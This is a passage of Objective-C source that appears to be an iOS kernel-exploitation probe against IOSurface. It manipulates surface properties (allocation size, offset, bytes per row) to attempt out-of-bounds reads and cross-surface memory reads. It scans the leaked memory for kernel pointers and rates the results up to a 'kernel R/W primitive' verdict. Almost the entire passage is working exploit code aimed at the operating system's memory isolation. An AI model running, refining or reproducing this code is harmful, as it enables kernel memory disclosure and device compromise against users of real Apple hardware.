                        log([NSString stringWithFormat:@"ADDREDIR: %@ — vm_read failed kr=%d", key, kr]);
                    }

                    sym.unlock(surfA, 0, NULL);

                    if (origVal) {
                        setValue(surfA, (__bridge CFStringRef)key, origVal);
                        CFRelease(origVal);
                    }

                    if (hasRedirect) break;
                }

            } // end step 1

            // Step 2: Try size inflation for OOB
            if (!isr_stopped()) {
                log(@"ADDREDIR: Step 2 — Inflate IOSurfaceAllocSize for OOB read");

                CFTypeRef origAlloc = copyValue(surfA, CFSTR("IOSurfaceAllocSize"));

                setValue(surfA, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(1048576));

                size_t newAllocA = sym.getAllocSize(surfA);
                log([NSString stringWithFormat:@"ADDREDIR: AllocSize after override: %zu (was %zu)", newAllocA, allocA]);

                if (newAllocA > allocA) {
                    anomalies++;
                    oobSuccess++;
                    log(@"ADDREDIR: *** HIGH — AllocSize inflated! Attempting OOB read ***");

                    sym.lock(surfA, 0, NULL);
                    void *curBase = sym.getBase(surfA);

                    uint8_t oobBuf[64];
                    memset(oobBuf, 0, sizeof(oobBuf));
                    vm_size_t oobOut = 0;
                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
                                                         (vm_address_t)curBase + allocA, sizeof(oobBuf),
                                                         (vm_address_t)oobBuf, &oobOut);

                    if (kr == KERN_SUCCESS && oobOut > 0) {
                        anomalies++;
                        int nonzero = 0;
                        for (int i = 0; i < (int)oobOut; i++) {
                            if (oobBuf[i] != 0) nonzero++;
                        }
                        log([NSString stringWithFormat:@"ADDREDIR: *** OOB READ SUCCESS — %zu bytes past boundary, %d nonzero ***",
                             oobOut, nonzero]);

                        uint64_t *qwords = (uint64_t *)oobBuf;
                        for (int q = 0; q < (int)(oobOut / 8); q++) {
                            if (qwords[q] > 0xFFFFFF8000000000ULL && qwords[q] < 0xFFFFFFFFFFFFFFFFULL) {
                                anomalies += 5;
                                log([NSString stringWithFormat:@"ADDREDIR: *** KERNEL PTR at OOB+%d = 0x%016llX ***",
                                     q * 8, (unsigned long long)qwords[q]]);
                            }
                        }
                    } else {
                        log([NSString stringWithFormat:@"ADDREDIR: OOB read failed kr=%d", kr]);
                    }

                    sym.unlock(surfA, 0, NULL);
                } else {
                    log(@"ADDREDIR: AllocSize unchanged — kernel ignores override");
                }

                if (origAlloc) {
                    setValue(surfA, CFSTR("IOSurfaceAllocSize"), origAlloc);
                    CFRelease(origAlloc);
                }

            } // end step 2

            // Step 3: Try offset manipulation
            if (!isr_stopped()) {
                log(@"ADDREDIR: Step 3 — Manipulate IOSurfaceOffset to shift mapped region");

                setValue(surfA, CFSTR("IOSurfaceOffset"), (__bridge CFTypeRef)@(4096));

                sym.lock(surfA, 0, NULL);
                void *offsetBase = sym.getBase(surfA);
                sym.unlock(surfA, 0, NULL);

                if (offsetBase != baseA) {
                    anomalies++;
                    crossRead++;
                    log([NSString stringWithFormat:@"ADDREDIR: *** HIGH — Offset shifted base %p→%p (delta=%ld) ***",
                         baseA, offsetBase, (long)((intptr_t)offsetBase - (intptr_t)baseA)]);
                } else {
                    log(@"ADDREDIR: Offset override — base unchanged");
                }

                setValue(surfA, CFSTR("IOSurfaceOffset"), (__bridge CFTypeRef)@(0));

            } // end step 3

            // Step 4: Cross-surface read via BytesPerRow inflation
            if (!isr_stopped()) {
                log(@"ADDREDIR: Step 4 — BytesPerRow inflation + vm_read to reach surface B");

                setValue(surfA, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(131072));

                sym.lock(surfA, 0, NULL);
                void *curBase = sym.getBase(surfA);
                ptrdiff_t dist = (intptr_t)baseB - (intptr_t)curBase;
                log([NSString stringWithFormat:@"ADDREDIR: Distance A→B = %td bytes", dist]);

                if (dist > 0 && dist < 10000000) {
                    uint8_t crossBuf[16];
                    memset(crossBuf, 0, sizeof(crossBuf));
                    vm_size_t crossOut = 0;
                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
                                                         (vm_address_t)curBase + dist, sizeof(crossBuf),
                                                         (vm_address_t)crossBuf, &crossOut);

                    if (kr == KERN_SUCCESS && crossOut > 0) {
                        int bbCount = 0;
                        for (int i = 0; i < (int)crossOut; i++) {
                            if (crossBuf[i] == 0xBB) bbCount++;
                        }
                        if (bbCount > 8) {
                            crossRead++;
                            anomalies += 3;
                            log([NSString stringWithFormat:@"ADDREDIR: *** CROSS-READ HIT — read surface B data (0xBB x%d) via stride ***",
                                 bbCount]);
                        } else {
                            log([NSString stringWithFormat:@"ADDREDIR: Cross-read got data but not B's (byte0=0x%02X)", crossBuf[0]]);
                        }
                    } else {
                        log([NSString stringWithFormat:@"ADDREDIR: Cross-read failed kr=%d (distance may be too far)", kr]);
                    }
                } else {
                    log([NSString stringWithFormat:@"ADDREDIR: Distance A→B = %td — not suitable for cross-read", dist]);
                }

                sym.unlock(surfA, 0, NULL);
                setValue(surfA, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(256));

            } // end step 4

            CFRelease(surfA);
            CFRelease(surfB);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"ADDREDIR: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (redirectSuccess > 0) verdict = @"CRITICAL — address redirect achieved! Kernel R/W primitive available";
            else if (oobSuccess > 0 && crossRead > 0) verdict = @"HIGH — size inflation + cross-surface read confirmed";
            else if (oobSuccess > 0) verdict = @"HIGH — allocation size inflation enables OOB";
            else if (crossRead > 0) verdict = @"MEDIUM — cross-surface data readable via stride";
            else if (anomalies >= 2) verdict = @"MEDIUM — some key overrides affect mapping";
            else if (anomalies >= 1) verdict = @"LOW — minimal effect from key overrides";
            else verdict = @"LOW — no address redirect achieved";
            log([NSString stringWithFormat:@"ADDREDIR: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"redirectSuccess": @(redirectSuccess),
                @"oobSuccess": @(oobSuccess),
                @"crossRead": @(crossRead)
            };
            isr_checkpoint(@"ISR-AddrRedirect-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

